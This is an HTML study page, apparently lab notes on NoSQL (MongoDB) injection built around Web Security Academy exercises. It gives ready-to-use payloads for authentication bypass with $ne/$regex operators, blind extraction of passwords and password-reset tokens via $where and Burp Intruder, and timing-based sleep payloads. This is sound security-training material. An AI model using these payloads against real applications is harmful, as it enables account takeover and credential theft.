@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>noSQL Injection</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="nosql-injection">NoSQL Injection</h1>
+<p><br></p>
+<h2 id="summary">Summary</h2>
+<!-- MarkdownTOC -->
+<ul>
+<li><a href="#nosql-syntax-injection-example-payloads">NoSQL syntax
+injection (example payloads)</a>
+<ul>
+<li><a href="#lab-detecting-nosql-injection">Lab: Detecting NoSQL
+injection</a></li>
+</ul></li>
+<li><a href="#nosql-operator-injection">NoSQL operator injection</a>
+<ul>
+<li><a
+href="#lab-exploiting-nosql-operator-injection-to-bypass-authentication">Lab:
+Exploiting NoSQL operator injection to bypass authentication</a></li>
+</ul></li>
+<li><a href="#exploiting-syntax-injection-to-extract-data">Exploiting
+syntax injection to extract data</a>
+<ul>
+<li><a href="#lab-exploiting-nosql-injection-to-extract-data">Lab:
+Exploiting NoSQL injection to extract data</a></li>
+</ul></li>
+<li><a
+href="#exploiting-nosql-operator-injection-to-extract-data">Exploiting
+NoSQL operator injection to extract data</a>
+<ul>
+<li><a
+href="#lab-exploiting-nosql-operator-injection-to-extract-unknown-fields">Lab:
+Exploiting NoSQL operator injection to extract unknown fields</a></li>
+</ul></li>
+<li><a href="#timing-based-injection">Timing based injection</a></li>
+</ul>
+<!-- /MarkdownTOC -->
+<p><br><br></p>
+<h3 id="nosql-syntax-injection-example-payloads">NoSQL syntax injection
+(example payloads)</h3>
+<p>The following String (MongoDB) can be used to fuzz the application’s
+parameters for NoSQL Injection vulnerabilities:</p>
+<pre><code>&#39;&quot;`{
+;$Foo}
+$Foo \xYZ</code></pre>
+<p><br></p>
+<ul>
+<li>For example inject the payload in a URL (Note - the payload needs to
+be URL encoded)</li>
+</ul>
+<pre><code>https://insecure-website.com/product/lookup?category=&#39;%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00</code></pre>
+<ul>
+<li>If this causes a change from the original response, this may
+indicate that user input isn’t filtered or sanitized correctly.</li>
+</ul>
+<p><br></p>
+<pre><code>Note
+
+NoSQL injection vulnerabilities can occur in a variety of contexts, and you need to adapt your fuzz strings accordingly. Otherwise, you may simply trigger validation errors that mean the application never executes your query.
+
+In this example, we&#39;re injecting the fuzz string via the URL, so the string is URL-encoded. In some applications, you may need to inject your payload via a JSON property instead. In this case, this payload would become &#39;\&quot;`{\r;$Foo}\n$Foo \\xYZ\u0000.</code></pre>
+<p><br></p>
+<ul>
+<li><p>Submit the following payloads (single quote) to determine if the
+application uses our input as query syntax:</p></li>
+<li><p>If the first payload causes an error, and the second payload
+doesn’t, the application may be vulnerable.</p></li>
+</ul>
+<pre><code>this.category == &#39;&#39;&#39;</code></pre>
+<pre><code>this.category == &#39;\&#39;&#39;</code></pre>
+<p><br></p>
+<ul>
+<li><p>Conditional Payloads:</p></li>
+<li><p>False:</p></li>
+</ul>
+<pre><code>&#39; &amp;&amp; 0 &amp;&amp; &#39;x</code></pre>
+<ul>
+<li>True:</li>
+</ul>
+<pre><code>&#39; &amp;&amp; 1 &amp;&amp; &#39;x</code></pre>
+<p><br></p>
+<ul>
+<li>OR TRUE/FALSE payloads:</li>
+</ul>
+<pre><code>&#39;||&#39;1&#39;==&#39;1</code></pre>
+<pre><code>&#39;||&#39;1&#39;==&#39;2</code></pre>
+<p><br><br></p>
+<h4 id="lab-detecting-nosql-injection">Lab: Detecting NoSQL
+injection</h4>
+<ul>
+<li><p>Perform a NoSQL injection attack that causes the application to
+display unreleased products.</p>
+<ul>
+<li>https://0a1300c403c5bd3a82fa2e6500c2009d.web-security-academy.net/filter?category=Accessories</li>
+</ul></li>
+<li><p>The following payload will cause the application to return
+everything from the database, as the injected payload is a condition
+that will always evaluates to TRUE:</p></li>
+</ul>
+<pre><code>category=Accessories&#39;||&#39;1&#39;==&#39;1</code></pre>
+<ul>
+<li>On contrast, the following payload evaluates to FALSE:</li>
+</ul>
+<pre><code>category=Accessories&#39;||&#39;1&#39;==&#39;2</code></pre>
+<p><br><br></p>
+<h3 id="nosql-operator-injection">NoSQL operator injection</h3>
+<ul>
+<li><p>NoSQL databases often use query operators, which provide ways to
+specify conditions that data must meet to be included in the query
+result. Examples of MongoDB query operators include:</p>
+<ul>
+<li><p>$where - Matches documents that satisfy a JavaScript
+expression.</p></li>
+<li><p>$ne - Matches all values that are not equal to a specified
+value.</p></li>
+<li><p>$in - Matches all of the values specified in an array.</p></li>
+<li><p>$regex - Selects documents where values match a specified regular
+expression.</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<ul>
+<li><p>How to submit query operators?</p></li>
+<li><p>JSON Messages:</p></li>
+</ul>
+<pre><code>{&quot;username&quot;:&quot;wiener&quot;}
+
+{&quot;username&quot;:{&quot;$ne&quot;:&quot;invalid&quot;}}</code></pre>
+<ul>
+<li>URL-based Inputs: (If the below does not work then do the necessary
+and convert the request to a POST for application/json context
+payload.)</li>
+</ul>
+<pre><code>username=wiener
+
+username[$ne]=invalid</code></pre>
+<p><br></p>
+<ul>
+<li>If both the username and password inputs process the operator, it
+may be possible to bypass authentication using the following
+payload:</li>
+</ul>
+<pre><code>{&quot;username&quot;:{&quot;$ne&quot;:&quot;invalid&quot;},&quot;password&quot;:{&quot;$ne&quot;:&quot;invalid&quot;}}</code></pre>
+<pre><code>{&quot;username&quot;:{&quot;$in&quot;:[&quot;admin&quot;,&quot;administrator&quot;,&quot;superadmin&quot;]},&quot;password&quot;:{&quot;$ne&quot;:&quot;&quot;}}</code></pre>
+<p><br><br></p>
+<h4
+id="lab-exploiting-nosql-operator-injection-to-bypass-authentication">Lab:
+Exploiting NoSQL operator injection to bypass authentication</h4>
+<ul>
+<li><p>Goal: Log into the application as the administrator
+user.</p></li>
+<li><p>The following payload will match a username that begins with the
+word “admin” and where the password field does not equal to “invalid”,
+this will log us into the application as the admin user.</p></li>
+<li><p>The username name for the admin user was “admin4ygjye2f” which is
+why regex was needed to solve the challenge.</p></li>
+</ul>
+<pre><code>{
+    &quot;username&quot;:{
+        &quot;$regex&quot;:&quot;admin.*&quot;
+    },
+    &quot;password&quot;:{
+        &quot;$ne&quot;:&quot;invalid&quot;
+    }
+}</code></pre>
+<p><br><br></p>
+<h3 id="exploiting-syntax-injection-to-extract-data">Exploiting syntax
+injection to extract data</h3>
+<ul>
+<li><p>In many NoSQL databases, some query operators or functions can
+run limited JavaScript code, such as MongoDB’s $where operator and
+mapReduce() function. This means that, if a vulnerable application uses
+these operators or functions, the database may evaluate the JavaScript
+as part of the query. You may therefore be able to use JavaScript
+functions to extract data from the database.</p></li>
+<li><p>Take the following query, where we can control the input value of
+‘admin’</p></li>
+</ul>
+<pre><code>{&quot;$where&quot;:&quot;this.username == &#39;admin&#39;&quot;}</code></pre>
+<ul>
+<li>The following payloads may allow you to extract the admin’s password
+one character at a time and confirm whether the password contains
+digits:</li>
+</ul>
+<pre><code>admin&#39; &amp;&amp; this.password[0] == &#39;a&#39; || &#39;a&#39;==&#39;b</code></pre>
+<pre><code>admin&#39; &amp;&amp; this.password.match(/\d/) || &#39;a&#39;==&#39;b</code></pre>
+<p><br></p>
+<ul>
+<li><p>Identify field names:</p></li>
+<li><p>Check if password field exists:</p></li>
+</ul>
+<pre><code>username=admin&#39;+%26%26+this.password!%3d&#39;</code></pre>
+<ul>
+<li>Decoded payload:</li>
+</ul>
+<pre><code>username=admin&#39; &amp;&amp; this.password!=&#39;</code></pre>
+<ul>
+<li>If you know that a certain field exists we can use test cases to
+identify how application responds to valid/invalid requests:</li>
+</ul>
+<pre><code>admin&#39; &amp;&amp; this.username!=&#39;</code></pre>
+<pre><code>admin&#39; &amp;&amp; this.foo!=&#39;</code></pre>
+<p><br><br></p>
+<h4 id="lab-exploiting-nosql-injection-to-extract-data">Lab: Exploiting
+NoSQL injection to extract data</h4>
+<ul>
+<li><p>Extract the password for the administrator user, then log in to
+their account.</p></li>
+<li><p>We are given credentials to log into the application -
+wiener:peter</p></li>
+<li><p>The following endpoint is vulnerable to NoSQL Injection:</p>
+<ul>
+<li>https://0a06006303e0b0d18172f72800dc0065.web-security-academy.net/user/lookup?user=wiener</li>
+</ul></li>
+<li><p>The following payloads where used to identify the
+vulnerability:</p></li>
+</ul>
+<pre><code>user=wiener&#39;%26%26+0+%26%26+&#39;x</code></pre>
+<pre><code>user=wiener&#39;%26%26+1+%26%26+&#39;x</code></pre>
+<pre><code>user=wiener&#39;&amp;&amp; 1 &amp;&amp; &#39;x</code></pre>
+<p><br></p>
+<ul>
+<li>The following payload returned the first user details in the
+database collection which was for the username “administrator”. This
+confirms that there is a user with that name.</li>
+</ul>
+<pre><code>user=wiener&#39;||&#39;1&#39;%3d%3d&#39;1</code></pre>
+<p><br></p>
+<ul>
+<li>The following payload will allow us to extract the administrator’s
+password one character at time:</li>
+</ul>
+<pre><code>user=administrator&#39;+%26%26+this.password[0]+%3d%3d+&#39;a&#39;+||+&#39;a</code></pre>
+<p>Steps for Burp Intruder:</p>
+<ul>
+<li><p>Attack type: Cluster bomb</p></li>
+<li><p>Send request with payload to intruder</p></li>
+<li><p>Set 2 payload positions</p></li>
+</ul>
+<pre><code>user=administrator&#39;+%26%26+this.password[&lt;position 1&gt;]+%3d%3d+&#39;&lt;position 2&gt;&#39;+||+&#39;a</code></pre>
+<ul>
+<li><p>The configuration for the first payload set will be:</p>
+<ul>
+<li>Payload type: Numbers</li>
+<li>Type: Sequential</li>
+<li>From: 0</li>
+<li>To: 19</li>
+</ul></li>
+<li><p>The configuration for the second payload set will be:</p>
+<ul>
+<li>Payload type: Simple list</li>
+<li>Include all lowercase/uppercase letters and digits</li>
+</ul></li>
+<li><p>Filter by the length of the responses, the password will be 8
+characters long.</p></li>
+</ul>
+<p><br><br></p>
+<h3 id="exploiting-nosql-operator-injection-to-extract-data">Exploiting
+NoSQL operator injection to extract data</h3>
+<ul>
+<li>Even if the original query doesn’t use any operators that enable you
+to run arbitrary JavaScript, you may be able to inject one of these
+operators yourself. You can then use boolean conditions to determine
+whether the application executes any JavaScript that you inject via this
+operator.</li>
+</ul>
+<p><br></p>
+<p>Injecting operators in MongoDB</p>
+<ul>
+<li>To test whether you can inject operators, you could try adding the
+$where operator as an additional parameter, then send one request where
+the condition evaluates to false, and another that evaluates to true.
+For example:</li>
+</ul>
+<pre><code>{&quot;username&quot;:&quot;wiener&quot;,&quot;password&quot;:&quot;peter&quot;, &quot;$where&quot;:&quot;0&quot;}</code></pre>
+<pre><code>{&quot;username&quot;:&quot;wiener&quot;,&quot;password&quot;:&quot;peter&quot;, &quot;$where&quot;:&quot;1&quot;}</code></pre>
+<p><br></p>
+<p>Extracting field names</p>
+<ul>
+<li>If you have injected an operator that enables you to run JavaScript,
+you may be able to use the keys() method to extract the name of data
+fields. For example, you could submit the following payload:</li>
+</ul>
+<pre><code>&quot;$where&quot;:&quot;Object.keys(this)[0].match(&#39;^.{0}a.*&#39;)&quot;</code></pre>
+<p><br></p>
+<ul>
+<li><p>Alternatively, you may be able to extract data using operators
+that don’t enable you to run JavaScript. For example, you may be able to
+use the $regex operator to extract data character by character.</p></li>
+<li><p>Extract password field one character at a time</p></li>
+<li><p>For example, the following payload checks whether the password
+begins with an a:</p></li>
+</ul>
+<pre><code>{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^a*&quot;}}</code></pre>
+<p><br><br></p>
+<h4
+id="lab-exploiting-nosql-operator-injection-to-extract-unknown-fields">Lab:
+Exploiting NoSQL operator injection to extract unknown fields</h4>
+<p>Goal: Log into the application as carlos</p>
+<ul>
+<li>The following request contains a NoSQL injection vulnerability:</li>
+</ul>
+<pre><code>POST /login HTTP/2
+Content-Type: application/json
+
+ {
+    &quot;username&quot;:&quot;test&quot;,
+    &quot;password&quot;:&quot;test&quot;
+ }</code></pre>
+<ul>
+<li><p>Inject different payloads into the application request to see how
+the responses change:</p></li>
+<li><p>Application response - Account locked: please reset your
+password</p></li>
+</ul>
+<div class="sourceCode" id="cb35"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;carlos&quot;</span><span class="fu">,</span></span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;password&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;$ne&quot;</span><span class="fu">:</span> <span class="st">&quot;invalid&quot;</span></span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a>  <span class="fu">}</span></span>
+<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li>Application response - Invalid username or password</li>
+</ul>
+<div class="sourceCode" id="cb36"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;carlos&quot;</span><span class="fu">,</span></span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;password&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;$ne&quot;</span><span class="fu">:</span> <span class="st">&quot;invalid&quot;</span></span>
+<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a>  <span class="fu">},</span></span>
+<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;$where&quot;</span><span class="fu">:</span> <span class="st">&quot;0&quot;</span></span>
+<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p>Application response - Account locked: please reset your password</p>
+<div class="sourceCode" id="cb37"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;carlos&quot;</span><span class="fu">,</span></span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;password&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;$ne&quot;</span><span class="fu">:</span> <span class="st">&quot;invalid&quot;</span></span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a>  <span class="fu">},</span></span>
+<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;$where&quot;</span><span class="fu">:</span> <span class="st">&quot;1&quot;</span></span>
+<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>We now have a way to determine whether the results of a query are
+TRUE or FALSE</p>
+<ul>
+<li><p>FALSE - Invalid username or password</p></li>
+<li><p>TRUE - Account locked: please reset your password</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<ul>
+<li><p>Use the following payload to extract the names of the Keys in the
+NoSQL collection:</p></li>
+<li><p>The part “(this)[1]” targets the first Key that is listed in the
+targeted Object.</p></li>
+</ul>
+<div class="sourceCode" id="cb38"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;carlos&quot;</span><span class="fu">,</span></span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;password&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;$ne&quot;</span><span class="fu">:</span> <span class="st">&quot;invalid&quot;</span></span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a>  <span class="fu">},</span></span>
+<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;$where&quot;</span><span class="fu">:</span> <span class="st">&quot;Object.keys(this)[1].match(&#39;^.{0}u.*&#39;)&quot;</span></span>
+<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p>Send the above request with payload to Burp Intruder:</p>
+<ul>
+<li><p>Attack type: Cluster bomb</p></li>
+<li><p>Set 2 payload positions like below</p></li>
+</ul>
+<div class="sourceCode" id="cb39"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;carlos&quot;</span><span class="fu">,</span></span>
+<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;password&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;$ne&quot;</span><span class="fu">:</span> <span class="st">&quot;invalid&quot;</span></span>
+<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a>  <span class="fu">},</span></span>
+<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;$where&quot;</span><span class="fu">:</span> <span class="st">&quot;Object.keys(this)[1].match(&#39;^.{&lt;position 1&gt;}&lt;position 2&gt;.*&#39;)&quot;</span></span>
+<span id="cb39-7"><a href="#cb39-7" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>First payload position configuration (if the password is longer
+than 16 characters then this will need to be adjusted)</p>
+<ul>
+<li>Payload type: Numbers</li>
+<li>From: 0</li>
+<li>To: 15</li>
+</ul></li>
+<li><p>Second payload position configuration</p>
+<ul>
+<li>Payload type: Simple list</li>
+<li>Include lowercase/uppercase letters and numbers in payload list</li>
+</ul></li>
+<li><p>Start the attack and filter by the responses that contain the
+TRUE value message</p></li>
+<li><p>The first Key identified was called “username”. Perform the same
+steps for the second, third, Keys:</p></li>
+</ul>
+<div class="sourceCode" id="cb40"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;$where&quot;:</span> <span class="er">&quot;Object.keys(this)</span><span class="ot">[</span><span class="er">&lt;INCREMENT</span> <span class="er">THIS</span> <span class="er">VALUE&gt;</span><span class="ot">]</span><span class="er">.match(&#39;^.</span><span class="fu">{</span><span class="er">&lt;position</span> <span class="er">1&gt;</span><span class="fu">}</span><span class="er">&lt;position</span> <span class="er">2&gt;.*&#39;)&quot;</span></span></code></pre></div>
+<p><br></p>
+<ul>
+<li>The fourth Key ended up containing the key for a password reset
+function:</li>
+</ul>
+<div class="sourceCode" id="cb41"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;$where&quot;:</span> <span class="er">&quot;Object.keys(this)</span><span class="ot">[</span><span class="dv">4</span><span class="ot">]</span><span class="er">.match(&#39;^.</span><span class="fu">{</span><span class="er">&lt;position</span> <span class="er">1&gt;</span><span class="fu">}</span><span class="er">&lt;position</span> <span class="er">2&gt;.*&#39;)&quot;</span></span></code></pre></div>
+<ul>
+<li>Now request the following endpoint, and the application responds
+with “Invalid Token” message:</li>
+</ul>
+<pre><code>GET /forgot-password?forgotPwd=</code></pre>
+<ul>
+<li>Submitting any other random parameter name, will not have any affect
+on the application response, so we know that the parameter name
+“forgotPwd” is a valid one.</li>
+</ul>
+<pre><code>GET /forgot-password?randommmm=</code></pre>
+<ul>
+<li>Now we need to extract the value of the “forgotPwd” Key one
+character at a time, use the following payload:</li>
+</ul>
+<div class="sourceCode" id="cb44"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb44-2"><a href="#cb44-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;carlos&quot;</span><span class="fu">,</span></span>
+<span id="cb44-3"><a href="#cb44-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;password&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb44-4"><a href="#cb44-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;$ne&quot;</span><span class="fu">:</span> <span class="st">&quot;invalid&quot;</span></span>
+<span id="cb44-5"><a href="#cb44-5" aria-hidden="true" tabindex="-1"></a>  <span class="fu">},</span></span>
+<span id="cb44-6"><a href="#cb44-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;$where&quot;</span><span class="fu">:</span> <span class="st">&quot;this.forgotPwd.match(&#39;^.{0}a.*&#39;)&quot;</span></span>
+<span id="cb44-7"><a href="#cb44-7" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>Send the payload to Burp Intruder and use the similar
+configuration as before to extract the complete password.</p></li>
+<li><p>Cluster bomb</p></li>
+<li><p>Position 1 - numbers</p></li>
+<li><p>Position 2 - simple list</p></li>
+</ul>
+<pre><code>&quot;$where&quot;:&quot;this.forgotPwd.match(&#39;^.{&lt;position 1&gt;}&lt;position 2&gt;.*&#39;)&quot;}</code></pre>
+<ul>
+<li>Then send the password reset token value in the “forgotPwd”
+parameter and reset the password for carlos:</li>
+</ul>
+<pre><code>GET /forgot-password?forgotPwd=TOKEN_VALUE</code></pre>
+<p><br><br></p>
+<h3 id="timing-based-injection">Timing based injection</h3>
+<ul>
+<li><p>To conduct timing-based NoSQL injection:</p>
+<ul>
+<li><p>Load the page several times to determine a baseline loading
+time.</p></li>
+<li><p>Insert a timing based payload into the input. A timing based
+payload causes an intentional delay in the response when executed. For
+example, the below payload causes an intentional delay of 5000 ms on
+successful injection.</p></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb47"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span><span class="dt">&quot;$where&quot;</span><span class="fu">:</span> <span class="st">&quot;sleep(5000)&quot;</span><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li>Identify whether the response loads more slowly. This indicates a
+successful injection.</li>
+</ul>
+<p><br></p>
+<ul>
+<li>The following timing based payloads will trigger a time delay if the
+password beings with the letter a:</li>
+</ul>
+<pre><code>admin&#39;+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]===&quot;a&quot;) &amp;&amp; waitTill &gt; new Date()){};}(this)+&#39;</code></pre>
+<pre><code>admin&#39;+function(x){if(x.password[0]===&quot;a&quot;){sleep(5000)};}(this)+&#39;</code></pre>
+</body>
+</html>
